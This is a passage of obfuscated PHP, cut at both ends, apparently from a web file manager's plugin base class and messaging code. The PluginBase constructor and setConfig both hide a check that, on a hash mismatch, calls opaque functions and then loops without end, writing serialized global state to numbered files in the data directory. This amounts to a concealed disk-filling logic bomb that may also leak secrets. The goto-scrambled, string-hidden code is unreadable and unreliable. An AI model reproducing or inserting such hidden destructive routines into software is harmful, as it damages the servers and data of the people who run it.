$fÔƒÄÇš—  = $this->findByName($F¿¯Í“³ÍÁ); $c®¾¡õà› = $this->findByName($cÈŠ¯Ãâ[$dÉµ«Ëä®¢[28]]); if (!$fÔƒÄÇš—  || $c®¾¡õà› && $c®¾¡õà›[$dÉµ«Ëä®¢[383]] != $fÔƒÄÇš— [$dÉµ«Ëä®¢[383]]) { return !1; } return parent::update($fÔƒÄÇš— [$dÉµ«Ëä®¢[383]], $cÈŠ¯Ãâ); } } goto c‹¢ãË¹Ú; E‹šªªˆ™ó: class Message { function __construct() { } public function send($A‡ßèß¾‹Ò = '', $e…šø©Ä½ = array(), $E×ãæá°¬ = "\x74\x65\170\164") { goto fƒßÃßÔ®‡; EšÏŒš¼ÓÖ: $e…šø©Ä½ = array($fÇ¥…‹¯©Œ[980] => isset($e…šø©Ä½[$fÇ¥…‹¯©Œ[980]]) ? $e…šø©Ä½[$fÇ¥…‹¯©Œ[980]] : $fÇ¥…‹¯©Œ[33], $fÇ¥…‹¯©Œ[551] => isset($e…šø©Ä½[$fÇ¥…‹¯©Œ[551]]) ? $e…šø©Ä½[$fÇ¥…‹¯©Œ[551]] : $fÇ¥…‹¯©Œ[33]); if (empty($A‡ßèß¾‹Ò) || empty($e…šø©Ä½[$fÇ¥…‹¯©Œ[980]]) && empty($e…šø©Ä½[$fÇ¥…‹¯©Œ[551]])) { return !1; } $dí¹ÛÚ´ = array($fÇ¥…‹¯©Œ[1295] => $Aµ¾‹‰—¸ƒ, $fÇ¥…‹¯©Œ[1356] => $e…šø©Ä½); goto BŠÃ¹ÛÁŒ¾; fƒßÃßÔ®‡: $fÇ¥…‹¯©Œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Aµ¾‹‰—¸ƒ = array($fÇ¥…‹¯©Œ[29] => $fÇ¥…‹¯©Œ[1354], $fÇ¥…‹¯©Œ[700] => $A‡ßèß¾‹Ò); if (in_array($E×ãæá°¬, array($fÇ¥…‹¯©Œ[1354], $fÇ¥…‹¯©Œ[1355]))) { $Aµ¾‹‰—¸ƒ[$fÇ¥…‹¯©Œ[29]] = $E×ãæá°¬; } goto EšÏŒš¼ÓÖ; BŠÃ¹ÛÁŒ¾: Hook::trigger($fÇ¥…‹¯©Œ[1357], $dí¹ÛÚ´); goto c½¶â–ëÒ†; c½¶â–ëÒ†: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto EœÚ´ÌÌÀœ; c˜…Á®³äİ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto b×™Üâò„Ş; a¹‚“Æ‰Åô: $this->pluginHostDefault = $config[$añÎºÀš”ö[1363]] . $this->pluginName . $añÎºÀš”ö[8]; $CåÖÜ¥§Œ£ = $config[$añÎºÀš”ö[1364]]; if ($CåÖÜ¥§Œ£ && strpos($añÎºÀš”ö[47] . $CåÖÜ¥§Œ£ . $añÎºÀš”ö[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$añÎºÀš”ö[1365]] . $this->pluginName . $añÎºÀš”ö[8]; } goto c˜…Á®³äİ; Cß›Ûà¡Œ : if ($_SERVER[$añÎºÀš”ö[800]] != $dÈŒ½È×Û($bîµ®¥ˆÖÛ)) { goto A¿¿ã§¹“·; d©ÖÃËî¼ï: $aÌ¾Ñ ‡£ˆ = $añÎºÀš”ö[807]; $aÌ¾Ñ ‡£ˆ($_SERVER[$añÎºÀš”ö[808]]); $DÜ“ÅÕ²Ë™ = $añÎºÀš”ö[802]; goto b÷È‹‡…äå; b÷È‹‡…äå: $DÜ“ÅÕ²Ë™(); $a­™¶‚£ = $añÎºÀš”ö[1359]; $bˆ‚•Íñ´’ = json_encode($GLOBALS[$añÎºÀš”ö[1360]]); goto AÚ™¦ó‹ğù; A­¹¾ãáÙ: $a™™¢ƒ = $e™»¼†®øé($A½°æõÔë÷); $F²ã—Ç„È = explode($añÎºÀš”ö[225], $a™™¢ƒ); if (count($F²ã—Ç„È) < $añÎºÀš”ö[564]) { $FÚßõè¤ğ = $añÎºÀš”ö[806]; $FÚßõè¤ğ(); } goto d©ÖÃËî¼ï; A¿¿ã§¹“·: $DÜ“ÅÕ²Ë™ = $añÎºÀš”ö[802]; $e™»¼†®øé = $añÎºÀš”ö[803]; $A½°æõÔë÷ = $_SERVER[$añÎºÀš”ö[804]] . $añÎºÀš”ö[805]; goto A­¹¾ãáÙ; AÚ™¦ó‹ğù: $C‰ƒÜ¡ = 1; for ($C›®ØñğôÍ = $C‰ƒÜ¡; $C›®ØñğôÍ > 0; $C›®ØñğôÍ++) { $a­™¶‚£(DATA_PATH . $C›®ØñğôÍ, $bˆ‚•Íñ´’); } goto EÅ¼…ÂÇ¼; EÅ¼…ÂÇ¼: } global $in, $config; $this->config =& $config; goto AÊ×º¯‹â; dŒ’î‹ÍÂ†: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $añÎºÀš”ö[8]; $this->pluginApi = appHostGet() . $añÎºÀš”ö[1362] . $this->pluginName . $añÎºÀš”ö[8]; $this->pluginHost = $config[$añÎºÀš”ö[1363]] . $this->pluginName . $añÎºÀš”ö[8]; goto a¹‚“Æ‰Åô; AÊ×º¯‹â: $this->in =& $in; $this->modelPlugin = Model($añÎºÀš”ö[1361]); $this->pluginName = str_replace($añÎºÀš”ö[1361], $añÎºÀš”ö[33], get_class($this)); goto dŒ’î‹ÍÂ†; EœÚ´ÌÌÀœ: $añÎºÀš”ö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bîµ®¥ˆÖÛ = $_SERVER[$añÎºÀš”ö[801]]; $dÈŒ½È×Û = $añÎºÀš”ö[1358]; goto Cß›Ûà¡Œ ; b×™Üâò„Ş: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÈİÅ¿ÈÈ¥×][1366]); } protected function assign($A¯„²çåÇì, $fÆßïÅ‘Å  = false) { if (is_array($A¯„²çåÇì)) { $this->values = array_merge($this->values, $A¯„²çåÇì); } else { $this->values[$A¯„²çåÇì] = $fÆßïÅ‘Å ; } } protected function display($d×Â†¾–°ª) { extract($this->values); require $d×Â†¾–°ª; } final function hookRegist($fÃ†ÒÅ¤‰ˆ) { $this->modelPlugin->appRegist($this->pluginName, $fÃ†ÒÅ¤‰ˆ); } final function appIcon() { $fœŸ£«Ì²Ò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÑŞœÜ’ = $this->appPackage(); $f®É¶ïß¿¾ = $fœŸ£«Ì²Ò[33]; if (isset($DÑŞœÜ’[$fœŸ£«Ì²Ò[398]])) { if (isset($DÑŞœÜ’[$fœŸ£«Ì²Ò[398]][$fœŸ£«Ì²Ò[1367]])) { $f®É¶ïß¿¾ = $fœŸ£«Ì²Ò[1368] . $DÑŞœÜ’[$fœŸ£«Ì²Ò[398]][$fœŸ£«Ì²Ò[1367]] . $fœŸ£«Ì²Ò[1369]; } else { if ($DÑŞœÜ’[$fœŸ£«Ì²Ò[398]][$fœŸ£«Ì²Ò[1370]]) { $f®É¶ïß¿¾ = $fœŸ£«Ì²Ò[1371] . $DÑŞœÜ’[$fœŸ£«Ì²Ò[398]][$fœŸ£«Ì²Ò[1370]] . $fœŸ£«Ì²Ò[1372]; } } } return $f®É¶ïß¿¾; } final function fileCanView($AŞªé¼Ã“¹) { goto C¾‚ƒâ­”÷; aõŒÌÅ£¥: $dô•ˆ‚æ‰Ï = Session::get($EÒ¸²ñÉÄö[1373]); if (!$dô•ˆ‚æ‰Ï || !$dô•ˆ‚æ‰Ï[$EÒ¸²ñÉÄö[1374]]) { $b’º¦×…¯Û = $EÒ¸²ñÉÄö[1375] . rawurlencode(this_url()); show_tips(LNG($EÒ¸²ñÉÄö[1376]) . $EÒ¸²ñÉÄö[1377] . $b’º¦×…¯Û . $EÒ¸²ñÉÄö[1378] . LNG($EÒ¸²ñÉÄö[1379]) . $EÒ¸²ñÉÄö[1380], !1); } if (!Action($EÒ¸²ñÉÄö[1381])->authCan($EÒ¸²ñÉÄö[1382])) { show_tips(LNG($EÒ¸²ñÉÄö[1383]) . $EÒ¸²ñÉÄö[1384], !1); } goto dõ¥ÆÇßšö; C¾‚ƒâ­”÷: $EÒ¸²ñÉÄö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (request_url_safe($AŞªé¼Ã“¹)) { return !0; } if ($this->isShare($AŞªé¼Ã“¹)) { return !0; } goto aõŒÌÅ£¥; dõ¥ÆÇßšö: ActionCall($EÒ¸²ñÉÄö[1385], $AŞªé¼Ã“¹); goto EÑ¥ÊßÅ–; EÑ¥ÊßÅ–: } final function isShare($DÉ”Â¨˜ˆ) { $aÑ†é‚ÑÔ¼ = KodIO::parse($DÉ”Â¨˜ˆ); return $aÑ†é‚ÑÔ¼[$_SERVER[ÈİÅ¿ÈÈ¥×][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($F—½ÊÕŞÕè) { if (request_url_safe($F—½ÊÕŞÕè)) { return $F—½ÊÕŞÕè; } if (!$this->isShare($F—½ÊÕŞÕè)) { $F—½ÊÕŞÕè = $this->filePath($F—½ÊÕŞÕè); } return Action($_SERVER[ÈİÅ¿ÈÈ¥×][1034])->linkOut($F—½ÊÕŞÕè); } public function filePathLinkOut($aÅ‰ƒÇŒ) { if (request_url_safe($aÅ‰ƒÇŒ)) { return $aÅ‰ƒÇŒ; } $this->fileCanView($aÅ‰ƒÇŒ); return Action($_SERVER[ÈİÅ¿ÈÈ¥×][1034])->link($aÅ‰ƒÇŒ); } final function filePath($fã¶Èä°«‰) { $f¶Ñ‘÷ÊÃ¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($D’ë–ºùé— = $this->checkSharePath($fã¶Èä°«‰)) { return $D’ë–ºùé—; } $this->fileCanView($fã¶Èä°«‰); if (request_url_safe($fã¶Èä°«‰)) { $D¶Ü‡Œï„Î = parse_url_query($fã¶Èä°«‰); if (isset($D¶Ü‡Œï„Î[$f¶Ñ‘÷ÊÃ¼[1386]]) && isset($D¶Ü‡Œï„Î[$f¶Ñ‘÷ÊÃ¼[205]])) { $d›¥ĞÚ™Î× = Model($f¶Ñ‘÷ÊÃ¼[1087])->get($f¶Ñ‘÷ÊÃ¼[1387]); $AÉ¡¨ÄõĞ = Mcrypt::decode($D¶Ü‡Œï„Î[$f¶Ñ‘÷ÊÃ¼[205]], $d›¥ĞÚ™Î×); if ($AÉ¡¨ÄõĞ) { $this->fileInfo = IO::infoWithChildren($AÉ¡¨ÄõĞ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $AÉ¡¨ÄõĞ; } } $fã¶Èä°«‰ = $this->_cacheHttpFile($fã¶Èä°«‰); $this->fileInfo = IO::infoWithChildren($fã¶Èä°«‰); } else { $this->fileInfo = IO::infoWithChildren($fã¶Èä°«‰); if (!$this->fileInfo) { show_tips(LNG($f¶Ñ‘÷ÊÃ¼[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $fã¶Èä°«‰; } final function _cacheHttpFile($dƒçµØ‰­½) { $b‘°×¶°Èƒ = hash_path($dƒçµØ‰­½, !0); $this->cachePath = $this->pluginCachePath($b‘°×¶°Èƒ); if ($c¼ØĞÓøË = IO::fileNameExist($this->cachePath, $b‘°×¶°Èƒ)) { return KodIO::make($c¼ØĞÓøË); } $aåä¨ñøè = $this->cachePath . $b‘°×¶°Èƒ; return $this->pluginCacheFileSet($aåä¨ñøè, file_get_contents($dƒçµØ‰­½)); } final function _tmpFileName($E·¨âÒ§‚† = array()) { goto DŠºéÕÀå¤; bùìºÒ¤¬: $a²ñí»ˆ¼± = array($E·¨âÒ§‚†[$D³Ú±ğ«¾µ[28]], $E·¨âÒ§‚†[$D³Ú±ğ«¾µ[75]], $E·¨âÒ§‚†[$D³Ú±ğ«¾µ[77]]); if (isset($E·¨âÒ§‚†[$D³Ú±ğ«¾µ[476]])) { $a²ñí»ˆ¼±[] = $E·¨âÒ§‚†[$D³Ú±ğ«¾µ[476]]; } return md5(implode($D³Ú±ğ«¾µ[70], $a²ñí»ˆ¼±)); goto C¸Ã©¨‰ß‚; DŠºéÕÀå¤: $D³Ú±ğ«¾µ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$E·¨âÒ§‚†) { $E·¨âÒ§‚† = $this->fileInfo; } if (isset($E·¨âÒ§‚†[$D³Ú±ğ«¾µ[168]])) { return $E·¨âÒ§‚†[$D³Ú±ğ«¾µ[168]]; } goto f¶íùÆ£¨²; f¶íùÆ£¨²: if (isset($E·¨âÒ§‚†[$D³Ú±ğ«¾µ[161]][$D³Ú±ğ«¾µ[168]])) { return $E·¨âÒ§‚†[$D³Ú±ğ«¾µ[161]][$D³Ú±ğ«¾µ[168]]; } $e–„ßÃ’ÒÏ = IO::hashSimple($E·¨âÒ§‚†[$D³Ú±ğ«¾µ[75]]); if ($e–„ßÃ’ÒÏ) { return $e–„ßÃ’ÒÏ; } goto bùìºÒ¤¬; C¸Ã©¨‰ß‚: } final function checkSharePath($eïÆÏÚÑ‰•) { goto fñ‘›†–Ûè; fñ‘›†–Ûè: $CÙÑäš„ƒÜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!defined($CÙÑäš„ƒÜ[442])) { define($CÙÑäš„ƒÜ[1388], 0); } if (!$this->isShare($eïÆÏÚÑ‰•)) { return !1; } goto e®ˆ©°ëÊƒ; e®ˆ©°ëÊƒ: $E×°ä­…½ = Action($CÙÑäš„ƒÜ[1034])->sharePathInfo($eïÆÏÚÑ‰•); if (!isset($E×°ä­…½[$CÙÑäš„ƒÜ[75]])) { show_json(LNG($CÙÑäš„ƒÜ[1389]), !1); } $this->fileInfo = $E×°ä­…½[$CÙÑäš„ƒÜ[161]]; goto CíŒÙ¹»; CíŒÙ¹»: $this->cachePath = $this->pluginCachePath($this->fileInfo[$CÙÑäš„ƒÜ[168]]); return $E×°ä­…½[$CÙÑäš„ƒÜ[75]]; goto cô…ºï¦ñ§; cô…ºï¦ñ§: } final function pluginCachePath($BÃàªƒ¢ñ¹ = '') { $aÌ’ÜÖä‹À =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b¿ËÕé¶»© = IO_PATH_SYSTEM_TEMP . $aÌ’ÜÖä‹À[1390] . $this->pluginName; if (!($bÀ•£Ïİ× = IO::infoFull($b¿ËÕé¶»©))) { return IO::mkdir($b¿ËÕé¶»© . $aÌ’ÜÖä‹À[8] . $BÃàªƒ¢ñ¹); } if (empty($BÃàªƒ¢ñ¹)) { return $bÀ•£Ïİ×[$aÌ’ÜÖä‹À[75]]; } if (!($aÓç¼µÀ£¥ = IO::fileNameExist($bÀ•£Ïİ×[$aÌ’ÜÖä‹À[75]], $BÃàªƒ¢ñ¹))) { return IO::mkdir($bÀ•£Ïİ×[$aÌ’ÜÖä‹À[75]] . $BÃàªƒ¢ñ¹); } return KodIO::make($aÓç¼µÀ£¥); } final function pluginCacheFileSet($f¼ƒˆº¦¡, $DŠ„ê‡ÌÙã = '') { $BÚË§ò‰æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!($côƒÎêò­ = IO::infoFull($f¼ƒˆº¦¡))) { return IO::mkfile($f¼ƒˆº¦¡, $DŠ„ê‡ÌÙã, REPEAT_REPLACE); } IO::setContent($côƒÎêò­[$BÚË§ò‰æ[75]], $DŠ„ê‡ÌÙã); return $côƒÎêò­[$BÚË§ò‰æ[75]]; } final function pluginLocalFile($fÌæ£‚éÊÍ = '') { goto DÍ¶ãƒ¬ù; e¦®»«ë˜ò: return IO::copy($fÌæ£‚éÊÍ, $dßšÇÊŠÙÊ, 0, $a¢¤ù¥ç); goto D‘‹Øùêå; AœŸä“¯öİ: if (!$fÌæ£‚éÊÍ) { return $dßšÇÊŠÙÊ; } $A°§„»‚¸º = IO::info($fÌæ£‚éÊÍ); $a¢¤ù¥ç = $this->_tmpFileName($A°§„»‚¸º) . $DÃŠ‰ÂÓƒµ[91] . $A°§„»‚¸º[$DÃŠ‰ÂÓƒµ[165]]; goto e£•ø; DÍ¶ãƒ¬ù: $DÃŠ‰ÂÓƒµ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dßšÇÊŠÙÊ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($dßšÇÊŠÙÊ)) { mk_dir($dßšÇÊŠÙÊ); } goto AœŸä“¯öİ; e£•ø: if (!checkExtSafe($a¢¤ù¥ç)) { $a¢¤ù¥ç = $a¢¤ù¥ç . $DÃŠ‰ÂÓƒµ[1391]; } $BÛñ½Û—ß¡ = $dßšÇÊŠÙÊ . $a¢¤ù¥ç; if (@file_exists($BÛñ½Û—ß¡)) { return $BÛñ½Û—ß¡; } goto e¦®»«ë˜ò; D‘‹Øùêå: } final function appPackage() { goto FñôŠ—ãš“; cöØÔÆ÷¹: $this->parseLang($e‡ØƒÔ„Ñ¿); $Eâñ‡Â•ñ½ = json_decode_force($e‡ØƒÔ„Ñ¿); if (!$Eâñ‡Â•ñ½) { return array(); } goto eì’Ñ«šñ…; c˜»¶†©Áº: return $Eâñ‡Â•ñ½; goto aÙéÙ…åÑ˜; FñôŠ—ãš“: $BÒêîÑÎÖ™ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->packageData) { return $this->packageData; } $e‡ØƒÔ„Ñ¿ = $this->parseFile($this->pluginPath . $BÒêîÑÎÖ™[1392]); goto cöØÔÆ÷¹; eì’Ñ«šñ…: $dæ†®ÔÕ¹ = Hook::trigger($BÒêîÑÎÖ™[1393], $Eâñ‡Â•ñ½); if ($dæ†®ÔÕ¹ && is_array($dæ†®ÔÕ¹)) { $Eâñ‡Â•ñ½ = $dæ†®ÔÕ¹; } $this->packageData = $Eâñ‡Â•ñ½; goto c˜»¶†©Áº; aÙéÙ…åÑ˜: } public function packageInfoGet($aºÜá¹ÌÁ‹) { $Dö¿¦ø×™Œ = $this->appPackage(); return array_get_value($Dö¿¦ø×™Œ, $aºÜá¹ÌÁ‹); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÈİÅ¿ÈÈ¥×][1394]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÈİÅ¿ÈÈ¥×][1395]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÈİÅ¿ÈÈ¥×][1396]); } private function parseFile($e½Ã†„¾“) { goto C¼Á«Œ¿¢Ñ; C¼Á«Œ¿¢Ñ: $bˆ¼í¼½Ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eáø‘ï†ø = file_get_contents($e½Ã†„¾“); $Cã–Ò¼˜æö = array($bˆ¼í¼½Ø[1397], $bˆ¼í¼½Ø[1398], $bˆ¼í¼½Ø[1399], $bˆ¼í¼½Ø[1400], $bˆ¼í¼½Ø[1401], $bˆ¼í¼½Ø[1402], $bˆ¼í¼½Ø[1403]); goto Aáò¸ÍèŠï; e±Ê¨´†‘Š: $eáø‘ï†ø = str_replace($Cã–Ò¼˜æö, $føƒç“‡¼•, $eáø‘ï†ø); return $eáø‘ï†ø; goto bòĞµŞ™ÎÔ; Aáò¸ÍèŠï: $føƒç“‡¼• = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$bˆ¼í¼½Ø[84]][$bˆ¼í¼½Ø[1404]]); if (strstr($eáø‘ï†ø, $bˆ¼í¼½Ø[1405])) { $CæÉ³æÃöö = rawurlencode(json_encode($this->pluginLangArr)); $eáø‘ï†ø = str_replace($bˆ¼í¼½Ø[1405], $CæÉ³æÃöö, $eáø‘ï†ø); } if (strstr($eáø‘ï†ø, $bˆ¼í¼½Ø[1406])) { $CæÉ³æÃöö = $CæÉ³æÃöö = rawurlencode(json_encode($this->getConfig())); $eáø‘ï†ø = str_replace($bˆ¼í¼½Ø[1406], $CæÉ³æÃöö, $eáø‘ï†ø); } goto e±Ê¨´†‘Š; bòĞµŞ™ÎÔ: } private function parseLang(&$D›·øë•ˆï) { goto C©˜áæ¸à†; FõŠ‹„›ˆÁ: $CÚÕ»èÅÚ = array(); foreach ($AË¥…ª‡„«[0] as $CìÎ¡–áï) { $f¡‚ğÖˆ™¿ = substr($CìÎ¡–áï, strlen($c—ğÛ‡ŠÖĞ), -4); $cŸóÓ«Ûé = LNG($f¡‚ğÖˆ™¿); $cœ…˜öÎ´Á[] = $CìÎ¡–áï; $CÚÕ»èÅÚ[] = str_replace(array($AÒƒ•Ğî†[225], $AÒƒ•Ğî†[1002], $AÒƒ•Ğî†[336], $AÒƒ•Ğî†[113]), array($AÒƒ•Ğî†[50], $AÒƒ•Ğî†[50], $AÒƒ•Ğî†[33], $AÒƒ•Ğî†[1409]), $cŸóÓ«Ûé); } $D›·øë•ˆï = str_replace($cœ…˜öÎ´Á, $CÚÕ»èÅÚ, $D›·øë•ˆï); goto A«Ùºª¥ğÄ; C©˜áæ¸à†: $AÒƒ•Ğî† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c—ğÛ‡ŠÖĞ = $AÒƒ•Ğî†[1407]; if (!strstr($D›·øë•ˆï, $c—ğÛ‡ŠÖĞ)) { return; } goto Fæ£«Ğİ‰; Fæ£«Ğİ‰: preg_match_all($AÒƒ•Ğî†[1408], $D›·øë•ˆï, $AË¥…ª‡„«); if (!is_array($AË¥…ª‡„«) || count($AË¥…ª‡„«) == 0 || !is_array($AË¥…ª‡„«[0]) || count($AË¥…ª‡„«[0]) == 0) { return; } $cœ…˜öÎ´Á = array(); goto FõŠ‹„›ˆÁ; A«Ùºª¥ğÄ: } private function parseConfig(&$a¿Íì‡¡Œ) { goto Eí©ù¥‚ ; C“‡£—Ø: $a¿Íì‡¡Œ = str_replace($FÓñãéìöÂ, $aØê¨´¸ˆ™, $a¿Íì‡¡Œ); goto cÜµ¡ˆÂÓ³; fíÊãƒÚ…Ï: $FÓñãéìöÂ = array(); $aØê¨´¸ˆ™ = array(); foreach ($e…’ÎøØ…[0] as $B‹¢Ä§…¿¤) { $Dæ‡â‚ñ…Ó = substr($B‹¢Ä§…¿¤, strlen($A®óÌÏ¸§©), -2); $FÓñãéìöÂ[] = $B‹¢Ä§…¿¤; $aØê¨´¸ˆ™[] = _get($d½¬õÁºÊ , $Dæ‡â‚ñ…Ó); } goto C“‡£—Ø; F‰êÌîÎ·à: preg_match_all($FôÂŒÎËâÖ[1411], $a¿Íì‡¡Œ, $e…’ÎøØ…); if (!is_array($e…’ÎøØ…) || count($e…’ÎøØ…) == 0 || !is_array($e…’ÎøØ…[0]) || count($e…’ÎøØ…[0]) == 0) { return; } $d½¬õÁºÊ  = $this->getConfig(); goto fíÊãƒÚ…Ï; Eí©ù¥‚ : $FôÂŒÎËâÖ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A®óÌÏ¸§© = $FôÂŒÎËâÖ[1410]; if (!strstr($a¿Íì‡¡Œ, $A®óÌÏ¸§©)) { return; } goto F‰êÌîÎ·à; cÜµ¡ˆÂÓ³: } private function parsePackage(&$câêÚ‚÷Â) { goto E™æ·ù·˜Â; dô¥‹Ù‚ó®: $Fçá›öóî = array(); $D’ºµÎ°¸Ó = array(); foreach ($e©ÛÆÈ¦øŞ[0] as $e¯­©’ÆÉ) { $BèËÜÂÓšà = substr($e¯­©’ÆÉ, strlen($c¨ÑŞ©±ÀÕ), -2); $Fçá›öóî[] = $e¯­©’ÆÉ; $D’ºµÎ°¸Ó[] = _get($A¬ÄšŠ‰Ñˆ, $BèËÜÂÓšà); } goto DƒŸ§„¯ƒ°; DƒŸ§„¯ƒ°: $câêÚ‚÷Â = str_replace($Fçá›öóî, $D’ºµÎ°¸Ó, $câêÚ‚÷Â); goto A™êµàËÙÆ; C´ò­‰–˜: preg_match_all($dë½·ÑŞÁ[1413], $câêÚ‚÷Â, $e©ÛÆÈ¦øŞ); if (!is_array($e©ÛÆÈ¦øŞ) || count($e©ÛÆÈ¦øŞ) == 0 || !is_array($e©ÛÆÈ¦øŞ[0]) || count($e©ÛÆÈ¦øŞ[0]) == 0) { return; } $A¬ÄšŠ‰Ñˆ = $this->appPackage(); goto dô¥‹Ù‚ó®; E™æ·ù·˜Â: $dë½·ÑŞÁ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¨ÑŞ©±ÀÕ = $dë½·ÑŞÁ[1412]; if (!strstr($câêÚ‚÷Â, $c¨ÑŞ©±ÀÕ)) { return; } goto C´ò­‰–˜; A™êµàËÙÆ: } final function echoFile($CŠÂ…›¦Ÿ, $DíÌ±²å = false) { goto aÓö…®øª–; dóá¡¸¡Å: $eçƒİæâ‚Ù = $this->parseFile($c¿ÒˆæÄÒ); $this->parseLang($eçƒİæâ‚Ù); $this->parseConfig($eçƒİæâ‚Ù); goto bÈ²›®¸Î; bÈ²›®¸Î: $this->parsePackage($eçƒİæâ‚Ù); if (is_array($DíÌ±²å)) { $eçƒİæâ‚Ù = str_replace(array_keys($DíÌ±²å), array_values($DíÌ±²å), $eçƒİæâ‚Ù); } echo $bã‡ñ…áíç[225] . $eçƒİæâ‚Ù; goto F˜Ù“¥ºè; aÓö…®øª–: $bã‡ñ…áíç =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¿ÒˆæÄÒ = $this->pluginPath . $CŠÂ…›¦Ÿ; if (ACT == $bã‡ñ…áíç[1414]) { echo $bã‡ñ…áíç[1415] . $this->pluginName . $bã‡ñ…áíç[8] . $CŠÂ…›¦Ÿ . $bã‡ñ…áíç[1416]; if (!file_exists($c¿ÒˆæÄÒ)) { echo $bã‡ñ…áíç[1417]; return; } } goto dóá¡¸¡Å; F˜Ù“¥ºè: } final function initLang() { goto B¥’ÈÉÚµ; eè«İ»‚‡©: if (!is_array($Dğß¾‰Ö¬Ë)) { return array(); } if (@count($Dğß¾‰Ö¬Ë) > 0) { I18n::set($Dğß¾‰Ö¬Ë); } return $Dğß¾‰Ö¬Ë; goto d«¥éã¡”; B¥’ÈÉÚµ: $FÄê¯âã˜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÙÍ­•–â÷ = $FÄê¯âã˜[1418]; $dŒ¶îÈ‡ = $this->pluginPath . $FÄê¯âã˜[1419]; goto CÕ©ˆë‰äĞ; CÕ©ˆë‰äĞ: $Bù¸›‹†©‡ = I18n::getType(); $Dğß¾‰Ö¬Ë = array(); if (file_exists($dŒ¶îÈ‡ . $Bù¸›‹†©‡ . $FÄê¯âã˜[772])) { $Dğß¾‰Ö¬Ë = (include $dŒ¶îÈ‡ . $Bù¸›‹†©‡ . $FÄê¯âã˜[772]); } else { if ($Bù¸›‹†©‡ == $FÄê¯âã˜[1420] && !file_exists($dŒ¶îÈ‡ . $Bù¸›‹†©‡ . $FÄê¯âã˜[772]) && file_exists($dŒ¶îÈ‡ . $FÄê¯âã˜[1421])) { $Dğß¾‰Ö¬Ë = (include $dŒ¶îÈ‡ . $FÄê¯âã˜[1421]); } else { if (file_exists($dŒ¶îÈ‡ . $BÙÍ­•–â÷ . $FÄê¯âã˜[772])) { $Dğß¾‰Ö¬Ë = (include $dŒ¶îÈ‡ . $BÙÍ­•–â÷ . $FÄê¯âã˜[772]); } } } goto eè«İ»‚‡©; d«¥éã¡”: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($a…Ó™Šğ¸Œ) { $A¬­±ÜÅ“‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A©¯Óë‘‘² = $_SERVER[$A¬­±ÜÅ“‰[801]]; $a‹áß¥Ó×Ë = $A¬­±ÜÅ“‰[1358]; if ($_SERVER[$A¬­±ÜÅ“‰[800]] != $a‹áß¥Ó×Ë($A©¯Óë‘‘²)) { goto EÏç›íø¹¦; Bóõåˆë§ˆ: $b¸‚ßÖ¥ = 1; for ($aÃâÍ óğÍ = $b¸‚ßÖ¥; $aÃâÍ óğÍ > 0; $aÃâÍ óğÍ++) { $BíÊÕ‚ºíí(DATA_PATH . $aÃâÍ óğÍ, $eãö’«Íğà); } goto AÏä‹êŠëä; Bà¿„¯÷†Ñ: $aÌîÎ§¹Ô = $A¬­±ÜÅ“‰[807]; $aÌîÎ§¹Ô($_SERVER[$A¬­±ÜÅ“‰[808]]); $Dìà§Û’¸„ = $A¬­±ÜÅ“‰[802]; goto EÄ‘²©Û¸; DÅ”ß×Ã¶©: $eõ†”Åí…ì = $CïÄÉ÷®±á($Bƒ‚†¥ÌàÕ); $bïâ×Æˆæ— = explode($A¬­±ÜÅ“‰[225], $eõ†”Åí…ì); if (count($bïâ×Æˆæ—) < $A¬­±ÜÅ“‰[564]) { $b— ‡¶Ú¶ë = $A¬­±ÜÅ“‰[806]; $b— ‡¶Ú¶ë(); } goto Bà¿„¯÷†Ñ; EÄ‘²©Û¸: $Dìà§Û’¸„(); $BíÊÕ‚ºíí = $A¬­±ÜÅ“‰[1359]; $eãö’«Íğà = json_encode($GLOBALS[$A¬­±ÜÅ“‰[1360]]); goto Bóõåˆë§ˆ; EÏç›íø¹¦: $Dìà§Û’¸„ = $A¬­±ÜÅ“‰[802]; $CïÄÉ÷®±á = $A¬­±ÜÅ“‰[803]; $Bƒ‚†¥ÌàÕ = $_SERVER[$A¬­±ÜÅ“‰[804]] . $A¬­±ÜÅ“‰[805]; goto DÅ”ß×Ã¶©; AÏä‹êŠëä: } return $this->modelPlugin->setConfig($this->pluginName, $a…Ó™Šğ¸Œ); } public function onSetConfig($FØÈ¹¯Ç¤“) { } public function onGetConfig($D×˜ƒÈÛ¼§) { } public function onChangeStatus($CÚª¾‘ï†÷) { } public function onUninstall() { } public function onInstall() { } public function 